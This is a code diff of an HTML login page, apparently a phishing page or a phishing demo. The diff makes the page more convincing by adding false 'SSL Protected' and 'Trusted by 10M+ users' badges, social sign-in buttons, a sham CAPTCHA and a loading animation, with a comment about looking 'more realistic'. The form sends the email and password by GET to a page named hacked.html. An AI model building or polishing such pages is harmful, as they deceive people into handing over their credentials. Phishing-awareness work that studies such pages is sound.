@@ -3,179 +3,174 @@
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-<style>
-body {
-  font-family: Arial, Helvetica, sans-serif;
-}
-
-* {
-  box-sizing: border-box;
-}
-
-/* style the container */
-.container {
-  position: relative;
-  border-radius: 5px;
-  background-color: #f2f2f2;
-  padding: 20px 0 30px 0;
-} 
-
-/* style inputs and link buttons */
-input,
-.btn {
-  width: 100%;
-  padding: 12px;
-  border: none;
-  border-radius: 4px;
-  margin: 5px 0;
-  opacity: 0.85;
-  display: inline-block;
-  font-size: 17px;
-  line-height: 20px;
-  text-decoration: none; /* remove underline from anchors */
-}
-
-input:hover,
-.btn:hover {
-  opacity: 1;
-}
-
-/* add appropriate colors to fb, twitter and google buttons */
-.fb {
-  background-color: #3B5998;
-  color: white;
-}
-
-.twitter {
-  background-color: #55ACEE;
-  color: white;
-}
-
-.google {
-  background-color: #dd4b39;
-  color: white;
-}
-
-/* style the submit button */
-input[type=submit] {
-  background-color: #04AA6D;
-  color: white;
-  cursor: pointer;
-}
-
-input[type=submit]:hover {
-  background-color: #45a049;
-}
-
-/* Two-column layout */
-.col {
-  float: left;
-  width: 50%;
-  margin: auto;
-  padding: 0 50px;
-  margin-top: 6px;
-}
-
-/* Clear floats after the columns */
-.row:after {
-  content: "";
-  display: table;
-  clear: both;
-}
-
-/* vertical line */
-.vl {
-  position: absolute;
-  left: 50%;
-  transform: translate(-50%);
-  border: 2px solid #ddd;
-  height: 175px;
-}
-
-/* text inside the vertical line */
-.vl-innertext {
-  position: absolute;
-  top: 50%;
-  transform: translate(-50%, -50%);
-  background-color: #f1f1f1;
-  border: 1px solid #ccc;
-  border-radius: 50%;
-  padding: 8px 10px;
-}
-
-/* hide some text on medium and large screens */
-.hide-md-lg {
-  display: none;
-}
-
-/* bottom container */
-.bottom-container {
-  text-align: center;
-  background-color: #666;
-  border-radius: 0px 0px 4px 4px;
-}
-
-/* Responsive layout - when the screen is less than 650px wide, make the two columns stack on top of each other instead of next to each other */
-@media screen and (max-width: 650px) {
-  .col {
-    width: 100%;
-    margin-top: 0;
-  }
-  /* hide the vertical line */
-  .vl {
-    display: none;
-  }
-  /* show the hidden text on small screens */
-  .hide-md-lg {
-    display: block;
-    text-align: center;
-  }
-}
-</style>
+<link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==">
+<link rel="stylesheet" href="style.css">
+<title>Secure Login Portal - Authentication Required</title>
 </head>
 <body>
 
+<!-- Security Badge -->
+<div class="security-badge tooltip">
+  <i class="fa fa-lock"></i>Secure Connection
+  <span class="tooltiptext">Your connection is protected with 256-bit SSL encryption</span>
+</div>
+
+<!-- Header -->
+<div class="header">
+  <div class="logo">SecureAuth Portal</div>
+  <div class="tagline">Enterprise-grade authentication system</div>
+</div>
+
 <div class="container">
-  <form action="/hacked.html" method="get">
-    <div class="row">
-      <h2 style="text-align:center">Login to continue...</h2>
-      <div class="vl">
-        <span class="vl-innertext">or</span>
-      </div>
+  <!-- Trust Indicators -->
+  <div class="trust-indicators">
+    <div class="trust-item">
+      <i class="fa fa-shield"></i>
+      <span>SSL Protected</span>
+    </div>
+    <div class="trust-item">
+      <i class="fa fa-check-circle"></i>
+      <span>Verified Platform</span>
+    </div>
+    <div class="trust-item">
+      <i class="fa fa-users"></i>
+      <span>Trusted by 10M+ users</span>
+    </div>
+  </div>
 
-      <div class="col">
-        <a href="/hacked.html" class="fb btn">
-          <i class="fa fa-facebook fa-fw"></i> Login with Facebook
-         </a>
-        <a href="/hacked.html" class="twitter btn">
-          <i class="fa fa-twitter fa-fw"></i> Login with Twitter
+  <!-- Progress Indicator -->
+  <div class="progress-indicator">
+    <div class="progress-dot active"></div>
+    <div class="progress-dot"></div>
+    <div class="progress-dot"></div>
+  </div>
+
+  <form action="hacked.html" method="get" id="loginForm">
+    <div class="login-row">
+      <div class="social-section">
+        <h3 class="social-title">Sign in with your account</h3>
+        <a href="social.html?social=google" class="google btn">
+          <i class="fa fa-google fa-fw"></i> Continue with Google
         </a>
-        <a href="/hacked.html" class="google btn"><i class="fa fa-google fa-fw">
-          </i> Login with Google+
+        <a href="social.html?social=microsoft" class="microsoft btn">
+          <i class="fa fa-windows fa-fw"></i> Continue with Microsoft
+        </a>
+        <a href="social.html?social=facebook" class="fb btn">
+          <i class="fa fa-facebook fa-fw"></i> Continue with Facebook
         </a>
       </div>
-
-      <div class="col">
-        <div class="hide-md-lg">
-          <p>Or sign in manually:</p>
+      <div class="login-section">
+        <h3 class="social-title">Or sign in with email</h3>
+        <div class="input-group">
+          <input type="email" id="email" name="username" placeholder="Enter your email address" required>
+          <i class="fa fa-check-circle"></i>
         </div>
-
-        <input type="text" name="username" placeholder="Username" required>
-        <input type="password" name="password" placeholder="Password" required>
-        <input type="submit" value="Login">
+        <div class="input-group">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" placeholder="Enter your password" required>
+          <i class="fa fa-check-circle"></i>
+        </div>
+        <div class="captcha-container">
+          <div class="captcha-header">
+            <i class="fa fa-shield-alt"></i>
+            <strong>Security Verification</strong>
+          </div>
+          <div class="captcha-challenge">
+            <div class="captcha-image" id="captchaImage">A7B9X</div>
+            <input type="text" class="captcha-input" id="captchaInput" placeholder="Enter code above" required>
+            <button type="button" class="captcha-refresh" onclick="refreshCaptcha()" title="Refresh CAPTCHA">
+              <i class="fa fa-refresh"></i>
+            </button>
+          </div>
+        </div>
+        <label style="display: flex; align-items: center; margin: 15px 0; font-size: 14px;">
+          <input type="checkbox" style="width: auto; margin-right: 8px;" checked>
+          Keep me signed in for 30 days
+        </label>
+        <input type="submit" value="Sign In Securely" id="submitBtn">
+        <div class="loading" id="loadingDiv">
+          <div class="spinner"></div>
+          <div>Authenticating your credentials...</div>
+        </div>
       </div>
-      
     </div>
   </form>
 </div>
 
-<div class="bottom-container">
-  <div class="row">
-    <div class="col">
-      <a href="/hacked.html" style="color:white" class="btn">Forgot password?</a>
-    </div>
-  </div>
-</div>
+<script>
+// CAPTCHA functionality
+const captchaCodes = ['A7B9X', 'K3M8P', 'R5N2W', 'T9L4S', 'H6Q1Y', 'F8D7M', 'G3V5B', 'J9C2N'];
+let currentCaptcha = captchaCodes[0];
+
+function refreshCaptcha() {
+  const randomIndex = Math.floor(Math.random() * captchaCodes.length);
+  currentCaptcha = captchaCodes[randomIndex];
+  document.getElementById('captchaImage').textContent = currentCaptcha;
+  document.getElementById('captchaInput').value = '';
+}
+
+// Email validation with visual feedback
+document.getElementById('email').addEventListener('input', function() {
+  const email = this.value;
+  const inputGroup = this.parentElement;
+  
+  if (email.includes('@') && email.includes('.')) {
+    inputGroup.classList.add('valid');
+  } else {
+    inputGroup.classList.remove('valid');
+  }
+});
+
+// Password validation with visual feedback
+document.getElementById('password').addEventListener('input', function() {
+  const password = this.value;
+  const inputGroup = this.parentElement;
+  
+  if (password.length >= 6) {
+    inputGroup.classList.add('valid');
+  } else {
+    inputGroup.classList.remove('valid');
+  }
+});
+
+// Form submission with loading animation
+document.getElementById('loginForm').addEventListener('submit', function(e) {
+  const captchaInput = document.getElementById('captchaInput').value.toUpperCase();
+  
+  if (captchaInput !== currentCaptcha) {
+    e.preventDefault();
+    alert('Security code is incorrect. Please try again.');
+    refreshCaptcha();
+    return false;
+  }
+  
+  // Show loading animation
+  document.getElementById('submitBtn').disabled = true;
+  document.getElementById('loadingDiv').style.display = 'block';
+  
+  // Add small delay to make it look more realistic
+  setTimeout(() => {
+    // Form will submit naturally after this delay
+  }, 1500);
+});
+
+// Initialize on page load
+window.addEventListener('load', function() {
+  refreshCaptcha();
+});
+
+// Add some realistic browser behavior
+document.addEventListener('DOMContentLoaded', function() {
+  // Simulate checking for saved credentials
+  setTimeout(() => {
+    const email = document.getElementById('email');
+    if (Math.random() > 0.7) {
+      email.value = 'user@example.com';
+      email.dispatchEvent(new Event('input'));
+    }
+  }, 500);
+});
+</script>
 
 </body>
 </html>
